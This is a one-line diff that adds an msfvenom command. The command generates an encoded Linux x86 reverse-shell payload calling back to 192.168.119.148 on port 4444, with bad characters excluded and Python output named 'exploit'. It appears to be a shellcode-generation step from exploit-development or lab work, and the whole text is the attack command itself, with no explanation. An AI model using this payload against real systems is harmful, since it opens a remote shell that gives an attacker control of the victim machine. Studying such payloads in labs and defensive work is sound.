@@ -1,0 +1,1 @@
+msfvenom --platform linux -a x86 -p linux/x86/shell_reverse_tcp LHOST=192.168.119.148 LPORT=4444 -e x86/shikata_ga_nai -b x0ax0dx1ax75x9exbcx20x43 -f py -v exploit
